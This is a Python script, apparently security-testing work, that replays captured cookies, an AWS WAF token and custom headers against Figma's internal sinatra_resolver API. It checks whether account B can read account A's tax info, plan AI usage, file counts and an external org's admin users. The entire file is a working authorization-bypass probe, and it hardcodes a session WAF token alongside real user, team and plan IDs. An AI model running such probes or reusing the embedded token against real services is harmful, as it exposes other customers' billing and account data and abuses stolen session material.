"""sinatra_resolver 重打:用真实浏览器捕获的 cookie+头(A 会话,含 aws-waf-token)
验证:1) A→A 基线(格式是否通过) 2) B→A 越权(完整头 + WAF token)
"""
import sys, io, json, re, urllib.request, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# 从 curl 提取 cookie 和头
curl_text = io.open('_capture_search.curl', encoding='utf-8').read()
m = re.search(r"-b '([^']+)'", curl_text)
CK_A_REAL = m.group(1)
print(f"A 真实 cookie 长度: {len(CK_A_REAL)}")

B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_TEAM = "1666382706663462213"
B_TEAM = "1667396394890946753"
A_PLAN = "cc6b6125-a07f-4d39-a54c-50ef65f33919"
B_PLAN = "46b1d26c-c802-4ef1-a83c-d96cfe7295f4"
EXT_ORG = "1484997479016537761"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

REAL_HDRS = {
    "accept": "application/json",
    "origin": "https://www.figma.com",
    "referer": "https://www.figma.com/files/team/1666382706663462213/recents-and-sharing?fuid=1666382703778278399",
    "x-csrf-bypass": "yes",
    "x-figma-client-version": "2b21e65a5f4c6eeec607f7f2fef85a543e1e7410",
    "x-figma-support-request-id": "srid_MPMYZJ8TAHXQHDK6TF1DVS37Y",
    "x-figma-user-plan-max": "starter",
    "tsid": "898Au7HDiKZ4wBuy",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
}

def call(label, endpoint, params, cookie, uid, hdrs_extra):
    qs = urllib.parse.urlencode(params)
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Cookie": cookie, "X-Figma-User-ID": uid}
    hdrs.update(hdrs_extra)
    req = urllib.request.Request(
        f"https://www.figma.com/api/internal/livegraph/sinatra_resolver/{endpoint}?{qs}",
        headers=hdrs)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        raw = r.read().decode(errors='replace')
        print(f"[{label}] {r.status} {raw[:300]}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] {e.code} {raw[:300]}")
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:70]}")

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()

print("\n========== 1. A 真实会话 → A 自己(基线,完整头) ==========")
call("A tax_info", "tax_info", {"team_id": A_TEAM, "userId": A_UID}, CK_A_REAL, A_UID, REAL_HDRS)
call("A org_member_count", "org_member_count", {"org_id": A_TEAM, "userId": A_UID}, CK_A_REAL, A_UID, REAL_HDRS)
call("A plan_user_count", "plan_user_count", {"plan_id": A_PLAN, "userId": A_UID}, CK_A_REAL, A_UID, REAL_HDRS)
call("A plan_ai_usage_monthly", "plan_ai_usage_monthly", {"plan_id": A_PLAN, "userId": A_UID}, CK_A_REAL, A_UID, REAL_HDRS)
call("A project_file_count", "project_file_count", {"folder_id": "634606970", "userId": A_UID}, CK_A_REAL, A_UID, REAL_HDRS)

print("\n========== 2. A 真实会话 → A 自己(仅部分头,定位必需头) ==========")
call("A tax_info(无x-csrf)", "tax_info", {"team_id": A_TEAM, "userId": A_UID}, CK_A_REAL, A_UID, {k: v for k, v in REAL_HDRS.items() if k != "x-csrf-bypass"})
call("A tax_info(无client-version)", "tax_info", {"team_id": A_TEAM, "userId": A_UID}, CK_A_REAL, A_UID, {k: v for k, v in REAL_HDRS.items() if k != "x-figma-client-version"})
call("A tax_info(无waf-session)", "tax_info", {"team_id": A_TEAM, "userId": A_UID}, CK_A_REAL.replace("aws-waf-token=e0998fe1-d344-4a68-abe9-40e22bf343be:BgoAtEssq205AAAA:XP577Ak3u+757WeM92TEpEDCI5D0PuI4SGGG1VT1aHfBnoTHUaSbZ8avpGB9Dq13eXVVs71Pt/Vh6AZH3nq+J7txBge5xQMgSgy2FjCDtUxto5YtWrkFkFmjyYu2PL62FbUevWcgc+3Fzd1snAsqg/u7+TDjZjhtBuZ0PFx0Ak47VbJFLw2e9FwCifHMR7kFSYc0BmGYX68Kv03ssy92I9996YNGwzBV2L8jvKcI9GclSEBOHVWEOrEhG+D6pUPOyw==", ""), A_UID, REAL_HDRS)

print("\n========== 3. B cookie + A 的 WAF token + 完整头 → B→A(越权面) ==========")
CK_B_WAF = CK_B + "; aws-waf-token=e0998fe1-d344-4a68-abe9-40e22bf343be:BgoAtEssq205AAAA:XP577Ak3u+757WeM92TEpEDCI5D0PuI4SGGG1VT1aHfBnoTHUaSbZ8avpGB9Dq13eXVVs71Pt/Vh6AZH3nq+J7txBge5xQMgSgy2FjCDtUxto5YtWrkFkFmjyYu2PL62FbUevWcgc+3Fzd1snAsqg/u7+TDjZjhtBuZ0PFx0Ak47VbJFLw2e9FwCifHMR7kFSYc0BmGYX68Kv03ssy92I9996YNGwzBV2L8jvKcI9GclSEBOHVWEOrEhG+D6pUPOyw=="
call("B→A tax_info", "tax_info", {"team_id": A_TEAM, "userId": B_UID}, CK_B_WAF, B_UID, REAL_HDRS)
call("B→A plan_ai_usage_monthly", "plan_ai_usage_monthly", {"plan_id": A_PLAN, "userId": B_UID}, CK_B_WAF, B_UID, REAL_HDRS)
call("B→A org_admin_users_info", "org_admin_users_info", {"org_id": EXT_ORG, "userId": B_UID}, CK_B_WAF, B_UID, REAL_HDRS)
call("B→A project_file_count", "project_file_count", {"folder_id": "634606970", "userId": B_UID}, CK_B_WAF, B_UID, REAL_HDRS)

print("\n========== 4. B 原始 cookie + 完整头(无 WAF token)→ B→A ==========")
call("B→A tax_info(无waf)", "tax_info", {"team_id": A_TEAM, "userId": B_UID}, CK_B, B_UID, REAL_HDRS)
